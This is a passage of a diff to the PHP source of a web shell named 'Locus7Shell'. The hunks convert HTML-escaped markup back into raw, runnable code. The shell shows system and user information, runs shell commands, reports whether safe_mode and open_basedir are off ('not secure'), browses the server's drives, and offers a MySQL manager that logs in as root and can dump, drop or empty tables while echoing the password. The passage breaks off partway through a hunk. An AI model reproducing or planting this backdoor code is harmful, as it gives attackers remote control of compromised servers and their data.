@@ -1062,7 +1062,7 @@ if (is_array($types[$op]))
   $result["query"]  = $query;
   if ($types[$op] == 2)
   {
-   foreach($arr as $k=&gt;$v)
+   foreach($arr as $k=>$v)
    {
     if (strtoupper($v) == "LIMIT")
     {
@@ -1162,18 +1162,18 @@ else {$tmpdir_logs = realpath($tmpdir_logs);}
 if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
 {
 $safemode = TRUE;
-$hsafemode = "&lt;font color=red&gt;ON (secure)&lt;/font&gt;";
+$hsafemode = "<font color=red>ON (secure)</font>";
 }
-else {$safemode = FALSE; $hsafemode = "&lt;font color=green&gt;OFF (not secure)&lt;/font&gt;";}
+else {$safemode = FALSE; $hsafemode = "<font color=green>OFF (not secure)</font>";}
 $v = @ini_get("open_basedir");
-if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "&lt;font color=red&gt;".$v."&lt;/font&gt;";}
-else {$openbasedir = FALSE; $hopenbasedir = "&lt;font color=green&gt;OFF (not secure)&lt;/font&gt;";}
+if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "<font color=red>".$v."</font>";}
+else {$openbasedir = FALSE; $hopenbasedir = "<font color=green>OFF (not secure)</font>";}
 $sort = htmlspecialchars($sort);
 if (empty($sort)) {$sort = $sort_default;}
 $sort[1] = strtolower($sort[1]);
 $DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
 if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
-$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"&lt;a href=\"".$surl."act=phpinfo\" target=\"_blank\"&gt;&lt;b&gt;&lt;u&gt;PHP/".phpversion()."&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;",htmlspecialchars($DISP_SERVER_SOFTWARE));
+$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."act=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE));
 @ini_set("highlight.bg",$highlight_bg); //FFFFFF
 @ini_set("highlight.comment",$highlight_comment); //#FF8000
 @ini_set("highlight.default",$highlight_default); //#0000BB
@@ -1184,7 +1184,7 @@ if (!is_array($actbox)) {$actbox = array();}
 $dspact = $act = htmlspecialchars($act);
 $disp_fullpath = $ls_arr = $notls = null;
 $ud = urlencode($d);
-?>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;&lt;meta http-equiv="Content-Language" content="en-us"&gt;&lt;title&gt;<?php echo getenv("HTTP_HOST"); ?> - Locus7Shell&lt;/title&gt;&lt;STYLE&gt;TD { FONT-SIZE: 8pt; COLOR: #009900; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #009900; scrollbar-shadow-color: #000000; scrollbar-highlight-color: #00CC00; scrollbar-3dlight-color: #00CC00; scrollbar-darkshadow-color: #009900; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #000000; COLOR: green; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #009900; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #f89521; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #f89521; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #f89521; TEXT-DECORATION: none;}A:hover { COLOR: #f89521; TEXT-DECORATION: bold;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #009900; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #009900;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}&lt;/style&gt;&lt;/head&gt;&lt;BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0&gt;&lt;center&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"&gt;&lt;tr&gt;&lt;th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"&gt;&lt;p&gt;&lt;center&gt;&lt;img src="http://img244.imageshack.us/img244/6663/locus7sgm8.jpg"&gt;&lt;/p&gt;&lt;/center&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p align="left"&gt;&lt;b&gt;Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"&lt;br&gt;",1); ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;<?php if (!$win) {echo wordwrap(myshellexec("id"),90,"&lt;br&gt;",1);} else {echo get_current_user();} ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;Safe-mode:&nbsp;<?php echo $hsafemode; ?>&lt;/b&gt;&lt;/p&gt;&lt;p align="left"&gt;<?php
+?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - Locus7Shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #009900; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #009900; scrollbar-shadow-color: #000000; scrollbar-highlight-color: #00CC00; scrollbar-3dlight-color: #00CC00; scrollbar-darkshadow-color: #009900; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #000000; COLOR: green; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #009900; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #f89521; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #f89521; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #f89521; TEXT-DECORATION: none;}A:hover { COLOR: #f89521; TEXT-DECORATION: bold;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #009900; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #009900;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><center><img src="http://img244.imageshack.us/img244/6663/locus7sgm8.jpg"></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"<br>",1); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?></b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left"><?php
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
@@ -1203,21 +1203,21 @@ foreach ($e as $r)
   if ($j == $i) {break;}
   $j++;
 }
-echo "&lt;a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\"&gt;&lt;b&gt;".htmlspecialchars($b).DIRECTORY_SEPARATOR."&lt;/b&gt;&lt;/a&gt;";
+echo "<a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\"><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>";
 $i++;
 }
 echo "&nbsp;&nbsp;&nbsp;";
 if (is_writable($d))
 {
 $wd = TRUE;
-$wdt = "&lt;font color=green&gt;[ ok ]&lt;/font&gt;";
-echo "&lt;b&gt;&lt;font color=green&gt;".view_perms(fileperms($d))."&lt;/font&gt;&lt;/b&gt;";
+$wdt = "<font color=green>[ ok ]</font>";
+echo "<b><font color=green>".view_perms(fileperms($d))."</font></b>";
 }
 else
 {
 $wd = FALSE;
-$wdt = "&lt;font color=red&gt;[ Read-Only ]&lt;/font&gt;";
-echo "&lt;b&gt;".view_perms_color($d)."&lt;/b&gt;";
+$wdt = "<font color=red>[ Read-Only ]</font>";
+echo "<b>".view_perms_color($d)."</b>";
 }
 if (is_callable("disk_free_space"))
 {
@@ -1225,14 +1225,14 @@ $free = disk_free_space($d);
 $total = disk_total_space($d);
 if ($free === FALSE) {$free = 0;}
 if ($total === FALSE) {$total = 0;}
-if ($free &lt; 0) {$free = 0;}
-if ($total &lt; 0) {$total = 0;}
+if ($free < 0) {$free = 0;}
+if ($total < 0) {$total = 0;}
 $used = $total-$free;
 $free_percent = round(100/($total/$free),2);
-echo "&lt;br&gt;&lt;b&gt;Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)&lt;/b&gt;";
+echo "<br><b>Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)</b>";
 }
-echo "&lt;br&gt;";
-echo "&lt;b&gt;Your ip: &lt;a href=http://whois.domaintools.com/".$_SERVER["REMOTE_ADDR"]."&gt;".$_SERVER["REMOTE_ADDR"]."&lt;/a&gt; - Server ip: &lt;a href=http://whois.domaintools.com/".gethostbyname($_SERVER["HTTP_HOST"])."&gt;".gethostbyname($_SERVER["HTTP_HOST"])."&lt;/a&gt;&lt;/b&gt;&lt;br/&gt;";
+echo "<br>";
+echo "<b>Your ip: <a href=http://whois.domaintools.com/".$_SERVER["REMOTE_ADDR"].">".$_SERVER["REMOTE_ADDR"]."</a> - Server ip: <a href=http://whois.domaintools.com/".gethostbyname($_SERVER["HTTP_HOST"]).">".gethostbyname($_SERVER["HTTP_HOST"])."</a></b><br/>";
 $letters = "";
 if ($win)
 {
@@ -1244,15 +1244,15 @@ foreach (range("a","z") as $letter)
   if (!$bool) {$bool = is_dir($letter.":\\");}
   if ($bool)
   {
-   $letters .= "&lt;a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"")."&gt;[ ";
+   $letters .= "<a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">[ ";
    if ($letter.":" != $v) {$letters .= $letter;}
-   else {$letters .= "&lt;font color=green&gt;".$letter."&lt;/font&gt;";}
-   $letters .= " ]&lt;/a&gt; ";
+   else {$letters .= "<font color=green>".$letter."</font>";}
+   $letters .= " ]</a> ";
   }
 }
-if (!empty($letters)) {echo "&lt;b&gt;Detected drives&lt;/b&gt;: ".$letters."&lt;br&gt;";}
+if (!empty($letters)) {echo "<b>Detected drives</b>: ".$letters."<br>";}
 }
-if (count($quicklaunch) &gt; 0)
+if (count($quicklaunch) > 0)
 {
 foreach($quicklaunch as $item)
 {
@@ -1261,12 +1261,12 @@ foreach($quicklaunch as $item)
   $v = realpath($d."..");
   if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}
   $item[1] = str_replace("%upd",urlencode($v),$item[1]);
-  echo "&lt;a href=\"".$item[1]."\"&gt;".$item[0]."&lt;/a&gt;&nbsp;&nbsp;&nbsp;&nbsp;";
+  echo "<a href=\"".$item[1]."\">".$item[0]."</a>&nbsp;&nbsp;&nbsp;&nbsp;";
 }
 }
-echo "&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
-if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "&lt;TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width=\"100%\" valign=\"top\"&gt;".$donated_html."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";}
-echo "&lt;TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width=\"100%\" valign=\"top\"&gt;";
+echo "</p></td></tr></table><br>";
+if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">".$donated_html."</td></tr></table><br>";}
+echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">";
 if ($act == "") {$act = $dspact = "ls";}
 if ($act == "sql")
 {
@@ -1277,7 +1277,7 @@ if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
 if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
 if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
 $sql_surl .= "&";
-?>&lt;h3&gt;Attention! SQL-Manager is &lt;u&gt;NOT&lt;/u&gt; ready module! Don't reports bugs.&lt;/h3&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"&gt;&lt;tr&gt;&lt;td width="100%" height="1" colspan="2" valign="top"&gt;&lt;center&gt;<?php
+?><h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php
 if ($sql_server)
 {
   $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
@@ -1286,11 +1286,11 @@ if ($sql_server)
   if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
 }
 else {$sql_sock = FALSE;}
-echo "&lt;b&gt;SQL Manager:&lt;/b&gt;&lt;br&gt;";
+echo "<b>SQL Manager:</b><br>";
 if (!$sql_sock)
 {
   if (!$sql_server) {echo "NO CONNECTION";}
-  else {echo "&lt;center&gt;&lt;b&gt;Can't connect&lt;/b&gt;&lt;/center&gt;"; echo "&lt;b&gt;".$err."&lt;/b&gt;";}
+  else {echo "<center><b>Can't connect</b></center>"; echo "<b>".$err."</b>";}
 }
 else
 {
@@ -1301,59 +1301,59 @@ else
   $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
   $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
   $sqlquicklaunch[] = array("Logout",$surl."act=sql");
-  echo "&lt;center&gt;&lt;b&gt;MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")&lt;/b&gt;&lt;br&gt;";
-  if (count($sqlquicklaunch) &gt; 0) {foreach($sqlquicklaunch as $item) {echo "[ &lt;a href=\"".$item[1]."\"&gt;&lt;b&gt;".$item[0]."&lt;/b&gt;&lt;/a&gt; ] ";}}
-  echo "&lt;/center&gt;";
+  echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")</b><br>";
+  if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><b>".$item[0]."</b></a> ] ";}}
+  echo "</center>";
 }
-echo "&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;";
-if (!$sql_sock) {?>&lt;td width="28%" height="100" valign="top"&gt;&lt;center&gt;&lt;font size="5"&gt; i &lt;/font&gt;&lt;/center&gt;&lt;li&gt;If login is null, login is owner of process.&lt;li&gt;If host is null, host is localhost&lt;/b&gt;&lt;li&gt;If port is null, port is 3306 (default)&lt;/td&gt;&lt;td width="90%" height="1" valign="top"&gt;&lt;TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;b&gt;Please, fill the form:&lt;/b&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Username&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Password&lt;/b&gt;&nbsp;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Database&lt;/b&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;form action="<?php echo $surl; ?>" method="POST"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;tr&gt;&lt;td&gt;&lt;input type="text" name="sql_login" value="root" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="password" name="sql_passwd" value="" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="sql_db" value="" maxlength="64"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Host&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;PORT&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=right&gt;&lt;input type="text" name="sql_server" value="localhost" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="sql_port" value="3306" maxlength="6" size="3"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="submit" value="Connect"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;<?php }
+echo "</td></tr><tr>";
+if (!$sql_sock) {?><td width="28%" height="100" valign="top"><center><font size="5"> i </font></center><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="<?php echo $surl; ?>" method="POST"><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php }
 else
 {
   //Start left panel
   if (!empty($sql_db))
   {
-   ?>&lt;td width="25%" height="100%" valign="top"&gt;&lt;a href="<?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;<?php
+   ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade><?php
    $result = mysql_list_tables($sql_db);
    if (!$result) {echo mysql_smarterror();}
    else
    {
-    echo "---[ &lt;a href=\"".$sql_surl."&\"&gt;&lt;b&gt;".htmlspecialchars($sql_db)."&lt;/b&gt;&lt;/a&gt; ]---&lt;br&gt;";
+    echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
     $c = 0;
-    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "&lt;b&gt;+&nbsp;&lt;a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"&gt;&lt;b&gt;".htmlspecialchars($row[0])."&lt;/b&gt;&lt;/a&gt; (".$count_row[0].")&lt;/br&gt;&lt;/b&gt;"; mysql_free_result($count); $c++;}
+    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>+&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
     if (!$c) {echo "No tables found in database.";}
    }
   }
   else
   {
-   ?>&lt;td width="1" height="100" valign="top"&gt;&lt;a href="<?php echo $sql_surl; ?>"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;<?php
+   ?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade><?php
    $result = mysql_list_dbs($sql_sock);
    if (!$result) {echo mysql_smarterror();}
    else
    {
-    ?>&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;select name="sql_db"&gt;<?php
+    ?><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><select name="sql_db"><?php
     $c = 0;
     $dbs = "";
-    while ($row = mysql_fetch_row($result)) {$dbs .= "&lt;option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= "&gt;".$row[0]."&lt;/option&gt;"; $c++;}
-    echo "&lt;option value=\"\"&gt;Databases (".$c.")&lt;/option&gt;";
+    while ($row = mysql_fetch_row($result)) {$dbs .= "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= ">".$row[0]."</option>"; $c++;}
+    echo "<option value=\"\">Databases (".$c.")</option>";
     echo $dbs;
    }
-   ?>&lt;/select&gt;&lt;hr size="1" noshade&gt;Please, select database&lt;hr size="1" noshade&gt;&lt;input type="submit" value="Go"&gt;&lt;/form&gt;<?php
+   ?></select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form><?php
   }
   //End left panel
-  echo "&lt;/td&gt;&lt;td width=\"100%\" height=\"1\" valign=\"top\"&gt;";
+  echo "</td><td width=\"100%\" height=\"1\" valign=\"top\">";
   //Start center panel
   $diplay = TRUE;
   if ($sql_db)
   {
    if (!is_numeric($c)) {$c = 0;}
    if ($c == 0) {$c = "no";}
-   echo "&lt;hr size=\"1\" noshade&gt;&lt;center&gt;&lt;b&gt;There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").&lt;br&gt;";
-   if (count($dbquicklaunch) &gt; 0) {foreach($dbsqlquicklaunch as $item) {echo "[ &lt;a href=\"".$item[1]."\"&gt;".$item[0]."&lt;/a&gt; ] ";}}
-   echo "&lt;/b&gt;&lt;/center&gt;";
+   echo "<hr size=\"1\" noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>";
+   if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
+   echo "</b></center>";
    $acts = array("","dump");
    if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
    elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}
-   elseif ($sql_act == "tbldump") {if (count($boxtbl) &gt; 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
+   elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
    elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
    elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
    elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
@@ -1387,38 +1387,38 @@ else
    }
    if ($sql_act == "query")
    {
-    echo "&lt;hr size=\"1\" noshade&gt;";
